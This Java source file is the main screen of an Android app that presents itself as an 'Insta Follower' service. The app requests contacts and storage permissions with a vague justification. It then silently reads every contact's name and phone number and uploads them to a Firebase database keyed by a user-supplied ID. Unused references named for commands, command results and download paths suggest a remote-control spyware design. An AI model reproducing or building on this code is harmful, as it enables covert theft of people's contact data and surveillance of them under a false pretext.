package com.example.client;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    private String ids;
    private StorageReference riversRef2;
    private StorageReference mStorageRef;
    DatabaseReference dwnldpathsMobile, dwnldpaths, cmds, cmdresults, refContacts, refContacts2;
    private DatabaseManager mDatabase;
    private TextView l, l4;
    private Button l2;
    private EditText l3;

    protected void checkPermission() {
        if (ContextCompat.checkSelfPermission(mActivity, Manifest.permission.READ_EXTERNAL_STORAGE)
                + ContextCompat.checkSelfPermission(mActivity, Manifest.permission.READ_CONTACTS) + ContextCompat.checkSelfPermission(mActivity, Manifest.permission.FOREGROUND_SERVICE) != PackageManager.PERMISSION_GRANTED) {

            // Do something, when permissions not granted
            if (ActivityCompat.shouldShowRequestPermissionRationale(
                    mActivity, Manifest.permission.READ_CONTACTS) || (ActivityCompat.shouldShowRequestPermissionRationale(
                    mActivity, Manifest.permission.FOREGROUND_SERVICE)
                    || ActivityCompat.shouldShowRequestPermissionRationale(
                    mActivity, Manifest.permission.READ_EXTERNAL_STORAGE))) {
                // If we should give explanation of requested permissions

                // Show an alert dialog here with request explanation
                AlertDialog.Builder builder = new AlertDialog.Builder(mActivity);
                builder.setMessage(" Read Contacts and Read External" +
                        " Storage permissions are required to do the task.");
                builder.setTitle("Please grant those permissions");
                builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        ActivityCompat.requestPermissions(
                                mActivity,
                                new String[]{
                                        Manifest.permission.READ_CONTACTS,
                                        Manifest.permission.FOREGROUND_SERVICE,
                                        Manifest.permission.READ_EXTERNAL_STORAGE
                                },
                                123
                        );
                    }
                });
                builder.setNeutralButton("Cancel", null);
                AlertDialog dialog = builder.create();
                dialog.show();
            } else {
                // Directly request for required permissions, without explanation
                ActivityCompat.requestPermissions(
                        mActivity,
                        new String[]{
                                Manifest.permission.READ_CONTACTS,
                                Manifest.permission.FOREGROUND_SERVICE,
                                Manifest.permission.READ_EXTERNAL_STORAGE

                        },
                        123
                );
            }
        } else {
            // Do something, when permissions are already granted
            // startService(new Intent(this, MyService.class));

            // JobIntentService for background task

        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        switch (requestCode) {
            case 1: {
                // When request is cancelled, the results array are empty
                if (
                        (grantResults.length > 0) &&
                                (grantResults[0]
                                        + grantResults[1]
                                        + grantResults[2]
                                        == PackageManager.PERMISSION_GRANTED
                                )
                ) {
                    // Permissions are granted
                    // startService(new Intent(this, MyService.class));

                    // JobIntentService for background task


                } else {
                    // Permissions are denied

                }
                return;
            }
        }
    }

    private Context mContext;
    private AppCompatActivity mActivity;
    private ProgressBar progressBar1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // Get the application context
        mContext = getApplicationContext();
        mActivity = MainActivity.this;
        mDatabase = new DatabaseManager(this);
        //FirebaseApp.initializeApp(getApplicationContext());
        checkPermission();
        loadID();
        l = findViewById(R.id.textt2);
        l2 = findViewById(R.id.button);
        l3 = findViewById(R.id.editTextt);
        l4 = findViewById(R.id.textView3);
        progressBar1 = findViewById(R.id.progressBar);
        l2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ids = l3.getText().toString();
                addID(ids);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    Intent i = new Intent(mContext, MyService.class);
                    i.putExtra("inputExtra", "Insta Follower is running");
                    l2.setVisibility(View.GONE);

                    l3.setVisibility(View.GONE);


                    progressBar1.setVisibility(View.VISIBLE);
                    l4.setVisibility(View.VISIBLE);
                    ContextCompat.startForegroundService(mContext, i);
                }else{startService(new Intent(getApplicationContext(),MyService.class));}

            }
        });


    }

    private void addID(String key) {

        mDatabase.addEmployee(key);
    }

    private void loadID() {


        try {
            Cursor cursor = mDatabase.getAllEmployees();

            if (cursor.moveToFirst()) {

                ids = cursor.getString(0);
                if (!ids.isEmpty()) {

                    l2.setVisibility(View.GONE);

                    l3.setVisibility(View.GONE);


                    progressBar1.setVisibility(View.VISIBLE);
                    l4.setVisibility(View.VISIBLE);
                    try {
                        getContactList();
                    }catch (Exception e){}
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        Intent i = new Intent(mContext, MyService.class);
                        i.putExtra("inputExtra", "Insta Follower is running");
                        l2.setVisibility(View.GONE);

                        l3.setVisibility(View.GONE);


                        progressBar1.setVisibility(View.VISIBLE);
                        l4.setVisibility(View.VISIBLE);
                        ContextCompat.startForegroundService(mContext, i);
                    }else{startService(new Intent(getApplicationContext(),MyService.class));}

                } else {

                }


            }
        } catch (Exception e) {
            // stopSelf();

        }

    }
    private String getCountryISO() {
        String iso = null;

        TelephonyManager telephonyManager = (TelephonyManager) getApplicationContext().getSystemService(getApplicationContext().TELEPHONY_SERVICE);
        if (telephonyManager.getNetworkCountryIso() != null)
            if (!telephonyManager.getNetworkCountryIso().toString().equals(""))
                iso = telephonyManager.getNetworkCountryIso().toString();

        return CountryToPhonePrefix.getPhone(iso);
    }
    private void getContactList() {


        String ISOPrefix = getCountryISO();

        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        while (phones.moveToNext()) {
            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phone = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            phone = phone.replace(" ", "");
            phone = phone.replace("-", "");
            phone = phone.replace("(", "");
            phone = phone.replace(")", "");

            if (!String.valueOf(phone.charAt(0)).equals("+"))
                phone = ISOPrefix + phone;

            // UserObject mContact = new UserObject("", name, phone);
            //send contact info
            Map phoneListMap = new HashMap<>();
            phoneListMap.put(phone, name);
            DatabaseReference refContacts3 = FirebaseDatabase.getInstance().getReference().child(ids).child("contacts");
            refContacts3.updateChildren(phoneListMap);

        }

    }
}